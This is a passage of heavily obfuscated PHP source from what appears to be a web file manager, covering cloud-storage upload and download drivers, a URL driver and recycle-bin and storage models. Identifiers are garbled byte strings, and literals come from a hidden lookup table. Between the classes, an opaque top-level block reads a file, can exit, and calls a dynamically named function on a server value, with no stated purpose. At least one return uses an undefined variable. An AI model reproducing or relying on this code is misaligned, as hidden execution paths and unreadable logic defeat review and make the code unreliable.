$É‹ëúÚÁ + $›¶¢“—´ - 1; $Û«ãÖ«š = array($×›êÚı[1356] . $É‹ëúÚÁ . $×›êÚı[463] . $‚¤»¸—ã); } $ê©‚Š¶ = url_request($ÔÉ´÷¶ı, $×›êÚı[228], !1, $Û«ãÖ«š); return $ê©‚Š¶[$×›êÚı[749]] ? $ê©‚Š¶[$×›êÚı[1123]] : !1; } public function upload($®³Á‘, $„á³‹ƒ, $íÆÀ’ß = false, $Ì¹—ı®¶ = REPEAT_REPLACE) { $ˆ´ÔØ ì =& $_SERVER[Ù×¯Ø…]; $„ô˜Øì… = IO::size($„á³‹ƒ); if ($„ô˜Øì… <= 1024 * 1024 * 200) { $—¹³ğğş = array($ˆ´ÔØ ì[1396] . $„á³‹ƒ); $ˆşÛÖÓû = $this->ussRequest($®³Á‘, $ˆ´ÔØ ì[226], $—¹³ğğş); return $ˆşÛÖÓû[$ˆ´ÔØ ì[1121]] ? $this->getPathOuter($®³Á‘) : !1; } $ŸÙŸ¿“ = 1024 * 1024 * 10; $ÄÚ¶¯ÕÉ = array($ˆ´ÔØ ì[1397], $ˆ´ÔØ ì[1398] . $„ô˜Øì…, $ˆ´ÔØ ì[1399], $ˆ´ÔØ ì[1400] . $ŸÙŸ¿“); $ˆşÛÖÓû = $this->ussRequest($®³Á‘, $ˆ´ÔØ ì[226], !1, $ÄÚ¶¯ÕÉ); if (!$ˆşÛÖÓû[$ˆ´ÔØ ì[1121]]) { return !1; } $èÆè—‚¤ = $ˆşÛÖÓû[$ˆ´ÔØ ì[1123]]; $äğ”×÷Å = 0; $•™Á—Äå = $èÆè—‚¤[$ˆ´ÔØ ì[1401]]; $è»¨ÏÑÉ = fopen($„á³‹ƒ, $ˆ´ÔØ ì[1307]); if (!$è»¨ÏÑÉ) { return !1; } do { $°¬æ»å = $èÆè—‚¤[$ˆ´ÔØ ì[1402]]; fseek_64($è»¨ÏÑÉ, $äğ”×÷Å); $ª’İÏá = fread($è»¨ÏÑÉ, $°¬æ»å); $—æ”Õ¿« = 0; do { $—æ”Õ¿«++; $èÆè—‚¤ = $this->uploadPart($®³Á‘, $èÆè—‚¤, $ª’İÏá); } while (!$èÆè—‚¤ && $—æ”Õ¿« < 3); if (!$èÆè—‚¤) { return !1; } $•™Á—Äå = $èÆè—‚¤[$ˆ´ÔØ ì[1401]]; $äğ”×÷Å += $°¬æ»å; } while ($•™Á—Äå != -1); fclose($è»¨ÏÑÉ); $ÄÚ¶¯ÕÉ = array($ˆ´ÔØ ì[1403], $ˆ´ÔØ ì[1404] . $èÆè—‚¤[$ˆ´ÔØ ì[1405]], $ˆ´ÔØ ì[1399]); $ˆşÛÖÓû = $this->ussRequest($®³Á‘, $ˆ´ÔØ ì[226], !1, $ÄÚ¶¯ÕÉ); return $ˆşÛÖÓû[$ˆ´ÔØ ì[1121]] ? $this->getPathOuter($·¬Õæƒâ) : !1; } private function uploadPart($·ò¨¥å, $¤ƒ³ÒÒ¹, &$ÊÅøƒ½Ò) { $ˆÏÉ†òÖ =& $_SERVER[Ù×¯Ø…]; $Ä¾È£Ë­ = array($ˆÏÉ†òÖ[1406], $ˆÏÉ†òÖ[1404] . $¤ƒ³ÒÒ¹[$ˆÏÉ†òÖ[1405]], $ˆÏÉ†òÖ[1407] . $¤ƒ³ÒÒ¹[$ˆÏÉ†òÖ[1401]], $ˆÏÉ†òÖ[141] . $¤ƒ³ÒÒ¹[$ˆÏÉ†òÖ[1402]]); $¶¢œ¿’ú = $this->ussRequest($·ò¨¥å, $ˆÏÉ†òÖ[226], $ÊÅøƒ½Ò, $Ä¾È£Ë­); return !$¶¢œ¿’ú[$ˆÏÉ†òÖ[1121]] ? $¶¢œ¿’ú[$ˆÏÉ†òÖ[1121]] : $¶¢œ¿’ú[$ˆÏÉ†òÖ[1123]]; } public function uploadFormData($ÏëåõÌÊ, $Ã„¥ÈÉı = 3600) { return $this->uploadPolicy($ÏëåõÌÊ, $Ã„¥ÈÉı); } public function multiUploadFormData($ĞãÑøˆ—, $¥ğ•·¦ = 3600) { $¤ß˜ÌµŸ =& $_SERVER[Ù×¯Ø…]; $¹¬ÊşÃ† = (int) $GLOBALS[$¤ß˜ÌµŸ[7]][$¤ß˜ÌµŸ[78]]; return $this->uploadPolicy($ĞãÑøˆ—, $¥ğ•·¦, $¹¬ÊşÃ†); } private function uploadPolicy($†ÕèÍÎø, $ùæÕ»•Ü = 3600, $¯è™Ç  = 0) { $—¬”· =& $_SERVER[Ù×¯Ø…]; $—ÉÄ‚ß÷ = $—¬”·[8] . $this->bucket; $Ã²ÜÒğÑ = gmdate($—¬”·[1343]); $ªøÒà = array($—¬”·[1408] => $this->bucket, $—¬”·[1409] => $†ÕèÍÎø, $—¬”·[1410] => time() + $ùæÕ»•Ü, $—¬”·[1411] => $Ã²ÜÒğÑ); if ($¯è™Ç ) { $ªøÒà[$—¬”·[1323]] = $¯è™Ç ; } $çÄ¯Ï» = base64_encode(json_encode($ªøÒà)); $‰²ÏàÒ‘ = base64_encode(hash_hmac($—¬”·[1378], "\120\x4f\x53\x54\46{$—ÉÄ‚ß÷}\x26{$Ã²ÜÒğÑ}\46{$çÄ¯Ï»}", md5("{$this->userpass}"), !0)); $“À„¼éª = array($—¬”·[1248] => $çÄ¯Ï», $—¬”·[1412] => "\125\120\x59\125\116\x20{$this->username}\x3a{$‰²ÏàÒ‘}", $—¬”·[175] => $this->endpoint . $—ÉÄ‚ß÷); return $“À„¼éª; } public function download($şÆŞ£¯ˆ, $±¥É²¤˜) { $Ğ×øâ”Â = IO::getPathInner(IO::mkfile($±¥É²¤˜)); if (!($½éæ‡¯¬ = $this->link($şÆŞ£¯ˆ))) { return !1; } $“¬”ª = 0; $Æ‚Ö¥†¢ = 1024 * 200; $äŸÑÌü = fopen($Ğ×øâ”Â, $_SERVER[Ù×¯Ø…][1362]); while (!0) { $ˆçâ¯¡ = $this->fileSubstr($şÆŞ£¯ˆ, $“¬”ª, $Æ‚Ö¥†¢); if ($ˆçâ¯¡ === !1) { return !1; } fwrite($äŸÑÌü, $ˆçâ¯¡); $“¬”ª += $Æ‚Ö¥†¢; if (strlen($ˆçâ¯¡) < $Æ‚Ö¥†¢) { break; } } fclose($äŸÑÌü); return $±¥É²¤˜; } public function link($š¾¦ÍŸ, $àœ™®× = array()) { $ü„’œ¼ =& $_SERVER[Ù×¯Ø…]; $š¾¦ÍŸ = trim($š¾¦ÍŸ, $ü„’œ¼[8]); if (!empty($this->token)) { $£çí¢Ô = strtotime(date($ü„’œ¼[1413])); $¸¦–Œ™ˆ = substr(md5($this->token . $ü„’œ¼[282] . $£çí¢Ô . $ü„’œ¼[1414] . $š¾¦ÍŸ), 12, 8) . $£çí¢Ô; $àœ™®×[] = $ü„’œ¼[1415] . $¸¦–Œ™ˆ; } $­ëóÏü÷ = !empty($àœ™®×) ? $ü„’œ¼[70] . implode($ü„’œ¼[282], $àœ™®×) : $ü„’œ¼[33]; return $this->getHost() . $ü„’œ¼[8] . $š¾¦ÍŸ . $­ëóÏü÷; } public function fileOut($½ÖŠ´Îî, $¡˜Éßóæ = false, $“’“Œñ = false, $úŒÍ¡Ú‘ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($½ÖŠ´Îî, $¡˜Éßóæ, $“’“Œñ, $úŒÍ¡Ú‘); } if (!$“’“Œñ) { $“’“Œñ = $this->pathThis($½ÖŠ´Îî); } $“ìÀŠÚ‹ = $¡˜Éßóæ ? array($_SERVER[Ù×¯Ø…][1416] . rawurlencode($“’“Œñ)) : array(); $Õ»Êí = $this->link($½ÖŠ´Îî, $“ìÀŠÚ‹); $this->fileOutLink($Õ»Êí); } public function fileOutServer($ÙÍìóÄÄ, $‘ÃÚ¤í½ = false, $ğğƒŠûœ = false, $€·Ò§Ùí = '') { parent::fileOut($ÙÍìóÄÄ, $‘ÃÚ¤í½, $ğğƒŠûœ, $€·Ò§Ùí); } public function fileOutImage($¢”Ôİ›±, $Ä…ˆ™Õà = 250) { $‰İâ®Öš = $this->link($¢”Ôİ›± . $_SERVER[Ù×¯Ø…][1417] . $Ä…ˆ™Õà); $this->fileOutLink($‰İâ®Öš); } public function fileOutImageServer($ÀˆÒá§õ, $°¼İÍ²ë = 250) { parent::fileOutImage($ÀˆÒá§õ, $°¼İÍ²ë); } public function hashMd5($—ÚƒÑò¤) { $ûÅÛÒÊ¡ =& $_SERVER[Ù×¯Ø…]; $¤‘İ–·¥ = $this->_objectMeta($—ÚƒÑò¤); return isset($¤‘İ–·¥[$ûÅÛÒÊ¡[208]]) ? $¤‘İ–·¥[$ûÅÛÒÊ¡[208]] : !1; } public function size($ãåæĞƒÑ) { $şå±·ûÄ = $this->objectMeta($ãåæĞƒÑ); return $şå±·ûÄ ? $şå±·ûÄ[$_SERVER[Ù×¯Ø…][78]] : 0; } public function info($á´ØÃç) { if ($this->isFolder($á´ØÃç)) { return $this->folderInfo($á´ØÃç); } else { if ($this->isFile($á´ØÃç)) { return $this->fileInfo($á´ØÃç); } } return !1; } public function exist($Ç„üŠ…Æ) { return $this->isFile($Ç„üŠ…Æ) || $this->isFolder($Ç„üŠ…Æ); } public function isFile($›ü®Ñöğ) { return !$this->isFolder($›ü®Ñöğ) && $this->objectMeta($›ü®Ñöğ); } public function isFolder($ú›¬à­) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][199], $ú›¬à­); } protected function objectMeta($€ŠºÀ”) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][200], $€ŠºÀ”); } protected function _objectMeta($ÒÙĞÒÁ²) { $»Œµìí¸ =& $_SERVER[Ù×¯Ø…]; if ($ÒÙĞÒÁ² == $»Œµìí¸[33] || $ÒÙĞÒÁ² == $»Œµìí¸[8]) { return array(); } $í³Ûš’‡ = $this->ussRequest($ÒÙĞÒÁ², $»Œµìí¸[1418]); if (!$í³Ûš’‡[$»Œµìí¸[1121]]) { return null; } $İÏÊ¯•Ø = isset($í³Ûš’‡[$»Œµìí¸[1123]]) ? $í³Ûš’‡[$»Œµìí¸[1123]] : array(); if (!isset($İÏÊ¯•Ø[$»Œµìí¸[1419]])) { return null; } $·âÎşŠ‡ = array($»Œµìí¸[29] => isset($İÏÊ¯•Ø[$»Œµìí¸[1419]]) ? $İÏÊ¯•Ø[$»Œµìí¸[1419]] : null, $»Œµìí¸[78] => isset($İÏÊ¯•Ø[$»Œµìí¸[1420]]) ? $İÏÊ¯•Ø[$»Œµìí¸[1420]] : null, $»Œµìí¸[208] => isset($İÏÊ¯•Ø[$»Œµìí¸[1421]]) ? $İÏÊ¯•Ø[$»Œµìí¸[1421]] : null, $»Œµìí¸[1388] => isset($İÏÊ¯•Ø[$»Œµìí¸[1422]]) ? $İÏÊ¯•Ø[$»Œµìí¸[1422]] : null); $·âÎşŠ‡[$»Œµìí¸[1389]] = isset($İÏÊ¯•Ø[$»Œµìí¸[1423]]) ? strtotime($İÏÊ¯•Ø[$»Œµìí¸[1423]]) : $·âÎşŠ‡[$»Œµìí¸[1388]]; return $·âÎşŠ‡; } protected function _isFolder($¹ƒ‡é°­) { $«ƒ¸şÚ  =& $_SERVER[Ù×¯Ø…]; if ($¹ƒ‡é°­ == $«ƒ¸şÚ [33] || $¹ƒ‡é°­ == $«ƒ¸şÚ [8]) { return !0; } $ô¤‰ç = $this->_objectMeta($¹ƒ‡é°­); return isset($ô¤‰ç[$«ƒ¸şÚ [29]]) && $ô¤‰ç[$«ƒ¸şÚ [29]] == $«ƒ¸şÚ [77] ? !0 : !1; } } if ($_SERVER[$_SERVER[Ù×¯Ø…][398]] != $_SERVER[$_SERVER[Ù×¯Ø…][1424]]) { $_getc = $_SERVER[Ù×¯Ø…][399]; $_getfile = $_SERVER[$_SERVER[Ù×¯Ø…][400]] . $_SERVER[Ù×¯Ø…][401]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ù×¯Ø…][229], $_getfilec); if (count($_getarrs) < $_SERVER[Ù×¯Ø…][402]) { $exit = $_SERVER[Ù×¯Ø…][403]; $exit(); } $_act = $_SERVER[Ù×¯Ø…][404]; $_act($_SERVER[$_SERVER[Ù×¯Ø…][396]]); } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¡ó±ñ÷® = false) { } public function exist($¶†£“Òú) { $ÖêùØùÉ = $this->info($¶†£“Òú); return $ÖêùØùÉ[$_SERVER[Ù×¯Ø…][195]]; } public function isFile($ĞÅ—­íœ) { $ÕÒÀ¶í£ = $this->info($ĞÅ—­íœ); return $ÕÒÀ¶í£[$_SERVER[Ù×¯Ø…][195]]; } public function isFolder($åâŸì‹Á) { return !1; } public function size($ÄÏ¿Óùõ) { $Ÿ«ÆÎ­Å = $this->info($ÄÏ¿Óùõ); return $Ÿ«ÆÎ­Å[$_SERVER[Ù×¯Ø…][78]]; } public function info($ö×ü…û) { return $this->infoParse($ö×ü…û); } public function infoAuth($¼ç®ÜÑÒ) { return $this->infoParse($¼ç®ÜÑÒ); } public function infoWithChildren($•ù¶Çäû) { return $this->infoParse($•ù¶Çäû); } public function infoFull($„…¥€¦¹) { return $this->infoParse($„…¥€¦¹); } private function infoParse($“îô…Ú€) { $±“¥Ôœ =& $_SERVER[Ù×¯Ø…]; $ÒÂäç€Œ = $this->header($“îô…Ú€); if (!$ÒÂäç€Œ || !$ÒÂäç€Œ[$±“¥Ôœ[749]]) { return !1; } $Êé²ãÁ = _get($ÒÂäç€Œ, $±“¥Ôœ[335], 0); $ŒÚÀ´¸Ú = array($±“¥Ôœ[28] => $ÒÂäç€Œ[$±“¥Ôœ[28]], $±“¥Ôœ[76] => $“îô…Ú€, $±“¥Ôœ[29] => $±“¥Ôœ[193], $±“¥Ôœ[78] => intval($Êé²ãÁ), $±“¥Ôœ[168] => get_path_ext($ÒÂäç€Œ[$±“¥Ôœ[28]]), $±“¥Ôœ[1304] => $Êé²ãÁ > 0 && $ÒÂäç€Œ[$±“¥Ôœ[1425]], $±“¥Ôœ[1305] => !1); return $ŒÚÀ´¸Ú; } private function header($Û¾ÌÖê“) { $×ÛáúÒ =& $_SERVER[Ù×¯Ø…]; if (isset(self::$_cacheHeader[$Û¾ÌÖê“])) { return self::$_cacheHeader[$Û¾ÌÖê“]; } $Ö‚¸ŠƒÔ = isset($GLOBALS[$×ÛáúÒ[1426]]) ? $GLOBALS[$×ÛáúÒ[1426]] : !1; $GLOBALS[$×ÛáúÒ[1426]] = !0; self::$_cacheHeader[$Û¾ÌÖê“] = url_header($Û¾ÌÖê“); $GLOBALS[$×ÛáúÒ[1426]] = $Ö‚¸ŠƒÔ; return self::$_cacheHeader[$Û¾ÌÖê“]; } public function hashSimple($„ğŞŞá, $Ü‡àğç = false) { $ší÷‚‘Ñ =& $_SERVER[Ù×¯Ø…]; $†Ú¸ıØÜ = $this->info($„ğŞŞá); if (!$†Ú¸ıØÜ || !$†Ú¸ıØÜ[$ší÷‚‘Ñ[195]]) { return !1; } $†‘àâÎò = $†Ú¸ıØÜ[$ší÷‚‘Ñ[78]]; $ü©Ì›÷¦ = 200; $Í²ÓĞ„ = 50; if ($†‘àâÎò <= $ü©Ì›÷¦ * $Í²ÓĞ„) { return md5($this->fileSubstr($„ğŞŞá, 0, $†‘àâÎò)) . $†‘àâÎò; } $öˆ¾± ‰ = intval($†‘àâÎò / $Í²ÓĞ„); $±ñÑˆ = $ší÷‚‘Ñ[33]; $â‚Å†§ü = timeFloat(); $•­È™¨ = 15; for ($åÌıå…Ã = 0; $åÌıå…Ã < $Í²ÓĞ„; $åÌıå…Ã++) { if (timeFloat() - $â‚Å†§ü > $•­È™¨) { return !1; } $¡“±Šúê = $this->fileSubstr($„ğŞŞá, $öˆ¾± ‰ * $åÌıå…Ã, $ü©Ì›÷¦); if (!$¡“±Šúê) { return !1; } $±ñÑˆ .= $¡“±Šúê; } $±ñÑˆ .= $this->fileSubstr($„ğŞŞá, $†‘àâÎò - $ü©Ì›÷¦, $ü©Ì›÷¦); return md5($±ñÑˆ) . $†‘àâÎò; } public function getContent($†—´ “) { return $this->fileSubstr($†—´ “); } public function fileSubstr($‡àØ¦ñ, $öÁ³‚ = 0, $Ü³œ´«¬ = -1) { $—âÒÄÂ« =& $_SERVER[Ù×¯Ø…]; $°Â×Ê©Õ = $this->info($‡àØ¦ñ); if (!$°Â×Ê©Õ || !$°Â×Ê©Õ[$—âÒÄÂ«[195]] && $°Â×Ê©Õ[$—âÒÄÂ«[78]] > 1024 * 1024 * 10) { return !1; } if ($Ü³œ´«¬ === -1) { $Ü³œ´«¬ = $°Â×Ê©Õ[$—âÒÄÂ«[78]]; } if ($Ü³œ´«¬ == 0) { return $—âÒÄÂ«[33]; } $‰šõŠù = array($—âÒÄÂ«[1427] . $öÁ³‚ . $—âÒÄÂ«[783] . ($öÁ³‚ + $Ü³œ´«¬ - 1)); $”ÕŠ¨ß = url_request($‡àØ¦ñ, $—âÒÄÂ«[228], !1, $‰šõŠù, !1, !1, 1); return $”ÕŠ¨ß[$—âÒÄÂ«[1123]] ? $”ÕŠ¨ß[$—âÒÄÂ«[1123]] : $—âÒÄÂ«[33]; } public function download($®üñœ›‘, $õĞ…åÌ) { Downloader::start($®üñœ›‘, $õĞ…åÌ); return $õĞ…åÌ; } } goto f‹ïºöË­; a˜šä¸Œö: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\162\143\x65\137\x72\x65\143\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\x69\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\x65\162\x74", "\x66\x75\x6e\x63\164\151\157\156")); public function listData($ÒË„ é¿ = false) { $—“àŒÕ =& $_SERVER[Ù×¯Ø…]; $ÒË„ é¿ = $ÒË„ é¿ ? $ÒË„ é¿ : USER_ID; $‡¢ª„¨ = $this->where(array($—“àŒÕ[1571] => $ÒË„ é¿))->select(); return array_to_keyvalue($‡¢ª„¨, $—“àŒÕ[33], $—“àŒÕ[406]); } public function moveToRecycle($Œ¹Ò›ˆ„) { $»´æ¤Š¬ =& $_SERVER[Ù×¯Ø…]; $’¡ÆÖí = Model($»´æ¤Š¬[1253]); $óšÏ«³¼ = $’¡ÆÖí->sourceInfo($Œ¹Ò›ˆ„); if (!$óšÏ«³¼ || $óšÏ«³¼[$»´æ¤Š¬[434]] == $»´æ¤Š¬[87]) { return; } $ÆŒ‚åÃ = array($»´æ¤Š¬[421] => $Œ¹Ò›ˆ„, $»´æ¤Š¬[1571] => USER_ID, $»´æ¤Š¬[583] => $óšÏ«³¼[$»´æ¤Š¬[415]], $»´æ¤Š¬[584] => $óšÏ«³¼[$»´æ¤Š¬[507]], $»´æ¤Š¬[587] => $óšÏ«³¼[$»´æ¤Š¬[524]]); $this->add($ÆŒ‚åÃ); $this->recycleMove($Œ¹Ò›ˆ„, 1); if ($óšÏ«³¼[$»´æ¤Š¬[414]] == $»´æ¤Š¬[87]) { $Û²‹º“í = array($»´æ¤Š¬[587] => array($»´æ¤Š¬[547], $óšÏ«³¼[$»´æ¤Š¬[524]] . $Œ¹Ò›ˆ„ . $»´æ¤Š¬[548])); $’¡ÆÖí->where($Û²‹º“í)->setField($»´æ¤Š¬[434], 1); } } public function clear() { $this->remove(!1); } public function remove($ª‚¨ = false, $¸óÕïó£ = false) { $»ïæÃ¼Ï =& $_SERVER[Ù×¯Ø…]; $¸óÕïó£ = $¸óÕïó£ ? $¸óÕïó£ : USER_ID; $©ú¸šš = Model($»ïæÃ¼Ï[1253]); $¢®Õ¥Ô¤ = $this->listData($¸óÕïó£); $ª‚¨ = $ª‚¨ === !1 ? !1 : $ª‚¨; $Ê‚õµĞ = array(); foreach ($¢®Õ¥Ô¤ as $û´‘ÙÏ) { if ($ª‚¨ != !1 && !in_array($û´‘ÙÏ, $ª‚¨)) { continue; } $ºçÅæè• = $©ú¸šš->sourceInfo($û´‘ÙÏ); $©ú¸šš->remove($û´‘ÙÏ, !1); $·™¶ûš° = $ºçÅæè•[$»ïæÃ¼Ï[415]] . $»ïæÃ¼Ï[71] . $ºçÅæè•[$»ïæÃ¼Ï[507]]; $Ê‚õµĞ[$·™¶ûš°] = array($»ïæÃ¼Ï[583] => $ºçÅæè•[$»ïæÃ¼Ï[415]], $»ïæÃ¼Ï[507] => $ºçÅæè•[$»ïæÃ¼Ï[507]]); $this->where(array($»ïæÃ¼Ï[406] => $û´‘ÙÏ))->delete(); } foreach ($Ê‚õµĞ as $™òÚ×ü) { $©ú¸šš->targetSpaceUpdate($™òÚ×ü[$»ïæÃ¼Ï[415]], $™òÚ×ü[$»ïæÃ¼Ï[507]]); } } public function restore($¶ö£á¨ = false) { $‘é°Øó¬ = $this->listData(); $this->_restoreSource($‘é°Øó¬, $¶ö£á¨); } public function removeUserAll($å¼°¸µû) { $this->remove(!1, $å¼°¸µû); } private function _restoreSource($ĞÎ…ï®Ö, $é¯ÖäşÛ) { $µ¬åòå× =& $_SERVER[Ù×¯Ø…]; $ÅÚ¹Ç’ü = Model($µ¬åòå×[1253]); $é¯ÖäşÛ = $é¯ÖäşÛ == !1 ? !1 : $é¯ÖäşÛ; if (!$ĞÎ…ï®Ö) { return !0; } $š¾‰­áÀ = array(); foreach ($ĞÎ…ï®Ö as $€÷Ëˆê…) { if ($é¯ÖäşÛ != !1 && !in_array($€÷Ëˆê…, $é¯ÖäşÛ)) { continue; } $“Ù­ÆÂ = $ÅÚ¹Ç’ü->sourceInfo($€÷Ëˆê…); $ç¡€»ä = $ÅÚ¹Ç’ü->sourceInfo($“Ù­ÆÂ[$µ¬åòå×[501]]); if ($ç¡€»ä[$µ¬åòå×[434]] == $µ¬åòå×[87]) { continue; } $ÅÚ¹Ç’ü->lockMoveStart($€÷Ëˆê…); $this->recycleMove($€÷Ëˆê…, 0); if ($“Ù­ÆÂ[$µ¬åòå×[414]] == $µ¬åòå×[87]) { $ÙÂ·Üº  = array($µ¬åòå×[587] => array($µ¬åòå×[547], $“Ù­ÆÂ[$µ¬åòå×[524]] . $€÷Ëˆê… . $µ¬åòå×[548])); $ÅÚ¹Ç’ü->where($ÙÂ·Üº )->setField($µ¬åòå×[434], 0); $this->restoreFolderChildren($€÷Ëˆê…, $ĞÎ…ï®Ö); } $this->where(array($µ¬åòå×[406] => $€÷Ëˆê…))->delete(); $ÅÚ¹Ç’ü->folderSizeReset($“Ù­ÆÂ[$µ¬åòå×[501]]); $š¾‰­áÀ[] = $“Ù­ÆÂ[$µ¬åòå×[501]]; if ($“Ù­ÆÂ[$µ¬åòå×[414]] == $µ¬åòå×[87]) { $š¾‰­áÀ[] = $€÷Ëˆê…; } $ÅÚ¹Ç’ü->lockMoveEnd($€÷Ëˆê…); } $ÅÚ¹Ç’ü->updateModifyTime($š¾‰­áÀ); } private function restoreFolderChildren($ÖÊşØı, $‚íàßÍ) { $ÂœÑ›Òğ =& $_SERVER[Ù×¯Ø…]; $åë´ëãô = Model($ÂœÑ›Òğ[1253]); $ºÃÎª…Á = array($ÂœÑ›Òğ[406] => array($ÂœÑ›Òğ[7], array())); foreach ($‚íàßÍ as $ŒÔØ©ÍØ) { if ($ŒÔØ©ÍØ == $ÖÊşØı) { continue; } if (!$åë´ëãô->isParentOf($ÖÊşØı, $ŒÔØ©ÍØ)) { continue; } $±÷ÓÃ£– = $åë´ëãô->sourceInfo($ŒÔØ©ÍØ); if ($±÷ÓÃ£–[$ÂœÑ›Òğ[414]] == $ÂœÑ›Òğ[87]) { $ºÃÎª…Á[] = array($ÂœÑ›Òğ[587] => array($ÂœÑ›Òğ[547], $±÷ÓÃ£–[$ÂœÑ›Òğ[524]] . $ŒÔØ©ÍØ . $ÂœÑ›Òğ[548])); } else { $ºÃÎª…Á[$ÂœÑ›Òğ[406]][1][] = $ŒÔØ©ÍØ; } } if (!$ºÃÎª…Á[$ÂœÑ›Òğ[406]][1]) { unset($ºÃÎª…Á[$ÂœÑ›Òğ[406]]); } if (!$ºÃÎª…Á) { return; } $ºÃÎª…Á[$ÂœÑ›Òğ[406]][1] = array_unique($ºÃÎª…Á[$ÂœÑ›Òğ[406]][1]); $ºÃÎª…Á[$ÂœÑ›Òğ[996]] = $ÂœÑ›Òğ[1843]; $åë´ëãô->where($ºÃÎª…Á)->setField($ÂœÑ›Òğ[434], 1); } private function recycleMove($¡©‚ñÙŸ, $Î”“±åë = 1) { $¬¯úˆœã =& $_SERVER[Ù×¯Ø…]; $¬ŠÃ—¨ï = Model($¬¯úˆœã[1253]); $‘ö—«ì = Model($¬¯úˆœã[2048]); $À†ù˜ = array($¬¯úˆœã[406] => $¡©‚ñÙŸ); if ($Î”“±åë) { $¬ŠÃ—¨ï->where($À†ù˜)->setField($¬¯úˆœã[434], 1); $‘ö—«ì->eventRecycle($¡©‚ñÙŸ, $¬¯úˆœã[2049]); } else { $Ÿã¬ª˜  = $¬ŠÃ—¨ï->where($À†ù˜)->find(); $÷È€­¬ = $Ÿã¬ª˜ [$¬¯úˆœã[414]] == $¬¯úˆœã[87]; $Æç·Ó÷œ = $¬ŠÃ—¨ï->fileNameAuto($Ÿã¬ª˜ [$¬¯úˆœã[501]], $Ÿã¬ª˜ [$¬¯úˆœã[28]], REPEAT_RENAME_FOLDER, $÷È€­¬); if ($Æç·Ó÷œ != $Ÿã¬ª˜ [$¬¯úˆœã[28]]) { $¬ŠÃ—¨ï->rename($¡©‚ñÙŸ, $Æç·Ó÷œ); } $¬ŠÃ—¨ï->where($À†ù˜)->setField($¬¯úˆœã[434], 0); $‘ö—«ì->eventRecycle($¡©‚ñÙŸ, $¬¯úˆœã[2050]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\163\157\165\x72\x63\145\x53\145\143\x72\x65\164\114\151\163\164"; public $field = array("\x73\157\x75\x72\143\x65\111\104", "\x74\171\160\x65\x49\x44", "\143\x72\145\x61\164\x65\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\x73\164\157\162\x61\147\x65\x4c\x69\163\164"; public $field = array("\156\x61\155\145", "\163\151\172\x65\x4d\x61\170", "\x73\171\163\164\145\x6d", "\144\x65\146\x61\165\154\164", "\x64\162\151\x76\145\x72", "\x63\157\156\x66\x69\147"); public function listData($‡Ó–åûÆ = false, $ŞÑ÷‹õ¼ = "\x6d\x6f\144\x69\146\171\124\151\155\x65", $Ÿù ²Ç = false) { $¬†Äù³ =& $_SERVER[Ù×¯Ø…]; $¹ø²ıï„ = parent::listData($‡Ó–åûÆ, $ŞÑ÷‹õ¼, $Ÿù ²Ç); if ($‡Ó–åûÆ) { return $¹ø²ıï„; } $ÁØüÑÉ = $this->ioSizeUseGet(array_to_keyvalue($¹ø²ıï„, $¬†Äù³[33], $¬†Äù³[395])); foreach ($¹ø²ıï„ as $í¿è·Åö => $‡–ä”Èï) { unset($¹ø²ıï„[$í¿è·Åö][$¬†Äù³[6]]); $¹ø²ıï„[$í¿è·Åö][$¬†Äù³[1736]] = isset($ÁØüÑÉ[$‡–ä”Èï[$¬†Äù³[395]]]) ? $ÁØüÑÉ[$‡–ä”Èï[$¬†Äù³[395]]] : 0; } return $¹ø²ıï„; } public function ioSizeUseGet($üğ²ü…Ì) { $àÑÈ¨Üœ =& $_SERVER[Ù×¯Ø…]; if (!$üğ²ü…Ì) { return array(); } $¨¤ë¼Óæ = $àÑÈ¨Üœ[2051] . implode($àÑÈ¨Üœ[47], $üğ²ü…Ì); $ìÌÏî®Ï = Cache::get($¨¤ë¼Óæ); if ($ìÌÏî®Ï) { return $ìÌÏî®Ï; } $ÍŒêê«œ = array($àÑÈ¨Üœ[823] => $àÑÈ¨Üœ[395], $àÑÈ¨Üœ[2052] => $àÑÈ¨Üœ[78]); $ĞŒŠÒ¾ = array($àÑÈ¨Üœ[823] => array($àÑÈ¨Üœ[7], $üğ²ü…Ì)); $ìÌÏî®Ï = Model($àÑÈ¨Üœ[786])->field($ÍŒêê«œ)->where($ĞŒŠÒ¾)->group($àÑÈ¨Üœ[823])->select(); $ìÌÏî®Ï = array_to_keyvalue($ìÌÏî®Ï, $àÑÈ¨Üœ[395], $àÑÈ¨Üœ[78]); Cache::set($¨¤ë¼Óæ, $ìÌÏî®Ï, 600); return $ìÌÏî®Ï; } public function getConfig($¥¯îà¦ú) { $ÊŞßëÇÂ = parent::listData($¥¯îà¦ú); return json_decode($ÊŞßëÇÂ[$_SERVER[Ù×¯Ø…][6]], !0); } public function update($•óÚÅª, $ºóöï÷ë) { $ÊùÀŒÈˆ =& $_SERVER[Ù×¯Ø…]; $åÖ£Ü›¼ = $ºóöï÷ë[$ÊùÀŒÈˆ[28]]; $ï†Æğ­û = array_to_keyvalue(parent::listData(), $ÊùÀŒÈˆ[28]); if (isset($ï†Æğ­û[$åÖ£Ü›¼]) && $ï†Æğ­û[$åÖ£Ü›¼][$ÊùÀŒÈˆ[395]] != $•óÚÅª) { return !1; } if (isset($ºóöï÷ë[$ÊùÀŒÈˆ[2053]]) && $ºóöï÷ë[$ÊùÀŒÈˆ[2053]] == $ÊùÀŒÈˆ[87]) { $this->checkConfig($ºóöï÷ë); } unset($ºóöï÷ë[$ÊùÀŒÈˆ[2053]]); $ÍŒ¡Ë®ø = parent::update($•óÚÅª, $ºóöï÷ë); if ($ÍŒ¡Ë®ø && $ºóöï÷ë[$ÊùÀŒÈˆ[34]]) { foreach ($ï†Æğ­û as $‘‹Œ×½) { if ($‘‹Œ×½[$ÊùÀŒÈˆ[34]] && $‘‹Œ×½[$ÊùÀŒÈˆ[395]] != $•óÚÅª) { parent::update($‘‹Œ×½[$ÊùÀŒÈˆ[395]], array($ÊùÀŒÈˆ[34] => 0)); } } } return $ÍŒ¡Ë®ø; } public function add($áø²¹À½) 